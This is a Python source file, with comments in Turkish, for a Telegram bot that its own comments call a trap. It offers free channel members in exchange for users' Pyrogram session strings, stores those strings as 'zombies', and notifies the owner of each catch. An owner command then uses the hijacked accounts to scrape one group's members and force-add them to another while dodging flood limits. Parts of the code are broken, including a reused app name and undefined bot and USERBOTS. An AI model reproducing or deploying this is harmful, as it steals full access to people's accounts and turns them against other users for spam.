import os
import asyncio
import logging
import sqlite3
import re
from datetime import datetime, timedelta
from threading import Thread
from flask import Flask # <--- İŞTE BU EKSİKTİ
from pyrogram import Client, filters, idle, enums
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import (
    UserAlreadyParticipant, InviteHashExpired, ChannelPrivate, 
    PeerIdInvalid, FloodWait, UsernameInvalid, ChannelInvalid
)

# ==================== 1. WEB SERVER (RENDER İÇİN ŞART!) ====================
# Render'ın "Port yok" hatasını çözen kısım burası.
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot Aktif ve Çalışıyor! 🟢"

def run_web():
    # Render'ın verdiği portu dinle, yoksa 8080
    port = int(os.environ.get("PORT", 8080))
    # 0.0.0.0 ÇOK ÖNEMLİ!
    app.run(host="0.0.0.0", port=port)

def keep_alive():
    t = Thread(target=run_web)
    t.daemon = True
    t.start()
# --- AYARLAR ---
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
OWNER_ID = int(os.environ.get("OWNER_ID", "0"))

# Botu Başlat
app = Client("HavuzBot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# --- VERİTABANI (ZOMBİLERİ SAKLAMAK İÇİN) ---
DB_NAME = "zombiler.db"

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    # Zombiler tablosu: UserID ve Session String tutar
    c.execute('''CREATE TABLE IF NOT EXISTS zombies 
                 (user_id INTEGER PRIMARY KEY, session_string TEXT, added_today INTEGER)''')
    conn.commit()
    conn.close()

# Veritabanını başlat
init_db()

# --- YARDIMCI: ZOMBİ EKLEME ---
def add_zombie(user_id, session):
    conn = sqlite3.connect(DB_NAME)
    try:
        conn.cursor().execute("INSERT INTO zombies (user_id, session_string, added_today) VALUES (?, ?, 0)", (user_id, session))
        conn.commit()
        return True
    except sqlite3.IntegrityError:
        # Zaten varsa güncelle
        conn.cursor().execute("UPDATE zombies SET session_string=? WHERE user_id=?", (session, user_id))
        conn.commit()
        return True
    finally:
        conn.close()

# --- YARDIMCI: TÜM ZOMBİLERİ ÇEK ---
def get_all_zombies():
    conn = sqlite3.connect(DB_NAME)
    zombies = conn.cursor().execute("SELECT user_id, session_string FROM zombies").fetchall()
    conn.close()
    return zombies # [(id, session), (id, session)...]

# ==================== 1. MÜŞTERİ PANELİ (TUZAK) ====================

@app.on_message(filters.command("start") & filters.private)
async def welcome(client, message):
    txt = (
        "👋 **Hoşgeldin! Ücretsiz Üye Botuna Bağlan.**\n\n"
        "Kanalına **30 Gerçek Türk Üye** göndermek için hesabını bağlaman gerekir.\n\n"
        "🔐 **Güvenli Giriş:**\n"
        "Pyrogram Session String kodunuzu aşağıya yapıştırın.\n"
        "*(Botumuz hesabınıza zarar vermez, sadece karşılıklı havuz sistemidir.)*\n\n"
        "👇 **Kodu atın, üyeler gelsin:**"
    )
    await message.reply(txt)

@app.on_message(filters.text & filters.private & ~filters.command(["start", "hasat", "ekle"]))
async def capture_session(client, message):
    # Kullanıcı Session String attığında burası çalışır
    session_str = message.text.strip()
    user_id = message.from_user.id

    # Session geçerli mi diye test edelim
    try:
        msg = await message.reply("🔄 **Hesap Kontrol Ediliyor...**")
        async with Client("temp", api_id=API_ID, api_hash=API_HASH, session_string=session_str, in_memory=True) as temp_bot:
            me = await temp_bot.get_me()
            # Test başarılı, havuza ekle
            add_zombie(user_id, session_str)
            
        await msg.edit(f"✅ **BAŞARILI!**\nHoşgeldin **{me.first_name}**.\n\n🎁 Hesabın havuza eklendi. 30 Üye gönderimi sıraya alındı (Yoğunluğa göre 1-2 saat sürebilir).")
        
        # Admin'e haber ver
        await client.send_message(OWNER_ID, f"🎣 **YENİ BALIK!**\nID: `{user_id}`\nİsim: {me.first_name}\nHavuza eklendi.")

    except Exception as e:
        await message.reply(f"❌ **HATA:** Bu kod geçersiz veya bozuk.\n`{e}`")

# ==================== 2. ADMIN KOMUTU (ZOMBİLERİ ÇALIŞTIR) ====================

@app.on_message(filters.command("hasat") & filters.user(OWNER_ID))
async def harvest_members(client, message):
    # KOMUT: /hasat [KAYNAK_GRUP] [HEDEF_GRUP]
    try:
        args = message.command
        src_chat = args[1]
        dst_chat = args[2]
    except:
        await message.reply("⚠️ **Kullanım:** `/hasat @KaynakGrup @HedefGrup`")
        return

    zombies = get_all_zombies()
    total_zombies = len(zombies)
    
    status = await message.reply(f"🧟‍♂️ **ZOMBİ ORDUSU HAZIRLANIYOR...**\nToplam Asker: {total_zombies}\nHedef: Günde 45 Ekleme / Asker")

    # --- ZOMBİ DÖNGÜSÜ ---
    total_added = 0
    
    for z_id, z_session in zombies:
        try:
            # Her zombi için geçici bir Client başlat
            async with Client(f"zombie_{z_id}", api_id=API_ID, api_hash=API_HASH, session_string=z_session, in_memory=True) as z_bot:
                
                z_name = (await z_bot.get_me()).first_name
                await status.edit(f"⚙️ **Çalışan:** {z_name}\nSıradaki kurbanlar toplanıyor...")
                
                # Kaynak gruptan üyeleri çek
                # Not: Büyük gruplarda hepsini çekmek zordur, son aktifleri alır.
                members_to_add = []
                async for member in z_bot.get_chat_members(src_chat, limit=100):
                    if not member.user.is_bot and not member.user.is_deleted:
                        members_to_add.append(member.user.id)

                # EKLEME DÖNGÜSÜ (Günde 45 Limit)
                count = 0
                for target_user_id in members_to_add:
                    if count >= 45: break # Zombi yoruldu, sonraki zombiye geç

                    try:
                        await z_bot.add_chat_members(dst_chat, target_user_id)
                        count += 1
                        total_added += 1
                        
                        # 15 SANİYE BEKLE (Senin kuralın)
                        await asyncio.sleep(15) 
                        
                    except FloodWait as e:
                        print(f"{z_name} Flood yedi: {e.value}s")
                        break # Bu zombi ban yedi, sıradakine geç
                    except PeerFlood:
                        print(f"{z_name} Spam yedi.")
                        break # Sıradakine geç
                    except UserPrivacyRestricted:
                        pass # Kullanıcı eklemeyi kapatmış
                    except UserNotMutualContact:
                        pass # Sadece rehber ekleyebilir
                    except UserAlreadyParticipant:
                        pass # Zaten ekli
                    except Exception as e:
                        print(f"Hata: {e}")
                
                await status.edit(f"✅ **{z_name} Tamamladı!**\nEklenen: {count} kişi.\nDiğer zombiye geçiliyor...")

        except Exception as e:
            print(f"Zombi ({z_id}) Ölmüş: {e}")
            # Veritabanından silinebilir aslında ama şimdilik kalsın.

    await status.edit(f"🏁 **HASAT BİTTİ!**\nToplam {total_added} üye havuza çekildi.")

# ==================== 11. BAŞLATMA ====================
async def main():
    print("Sistem Başlatılıyor...")
    
    # 👇👇 BU SATIRI EKLEMEZSEN YİNE HATA VERİR 👇👇
    keep_alive() 
    # 👆👆 SİHİRLİ KOMUT BU 👆👆

    await bot.start()
    for i, ub in enumerate(USERBOTS):
        try: await ub.start(); print(f"✅ Bot {i+1} Aktif!")
        except Exception as e: print(f"⚠️ Bot {i+1} Hata: {e}")
    await idle()
    await bot.stop()
    for ub in USERBOTS:
        try: await ub.stop()
        except: pass

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())

